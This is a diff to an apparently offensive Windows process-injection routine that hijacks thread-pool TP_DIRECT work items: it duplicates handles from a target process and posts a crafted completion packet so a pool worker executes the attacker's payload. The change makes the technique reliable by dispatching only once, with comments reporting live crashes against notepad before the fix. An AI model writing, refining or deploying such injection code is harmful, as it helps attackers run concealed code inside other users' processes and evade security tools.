@@ -612,9 +612,11 @@ BOOL inject_via_tpdirect(INJECTCONTEXT * context, LPVOID lpStartAddress, LPVOID 
 	 *      Callback@0x38 = arg-forwarding stub}, payload@0x50/param@0x58
 	 *      stashed beyond the 0x48-byte struct
 	 *   3. walk the target handle table (SystemExtendedHandleInformation),
-	 *      DuplicateHandle every handle into us and NtSetIoCompletion each
-	 *      with our direct pointer as KeyContext. The kernel rejects every
-	 *      non-IOCP object (0xC0000024); the pool's IOCP accepts and fires.
+	 *      DuplicateHandle handles into us and NtSetIoCompletion with our
+	 *      direct pointer as KeyContext until the FIRST accept. The kernel
+	 *      rejects every non-IOCP object (0xC0000024); a pool IOCP accepts
+	 *      and fires - exactly once (TppCallbackEpilog clears Callback, a
+	 *      second post of the same direct would call NULL).
 	 *
 	 * Note: TpDirectCallback invokes Callback(direct, ...) - the thread
 	 * parameter does NOT ride through (same limitation as the official
@@ -790,6 +792,14 @@ BOOL inject_via_tpdirect(INJECTCONTEXT * context, LPVOID lpStartAddress, LPVOID 
 		CloseHandle(dup);
 		if (s2 == 0) {
 			accepted++;
+			/* ONE dispatch only: TppCallbackEpilog clears the work
+			 * item's Callback (+0x38) after the first worker runs it.
+			 * Posting the same TP_DIRECT to every accepting IOCP makes
+			 * sibling pool workers dispatch it again AFTER the epilog
+			 * zeroed Callback -> TppWorkerThread+0x456 calls NULL ->
+			 * EXECUTE at 0 (C-25 live, notepad patsy: 3 accepted IOCPs,
+			 * crash every round; the first dispatch DID fire). */
+			break;
 		}
 	}
 	free(hbuf);
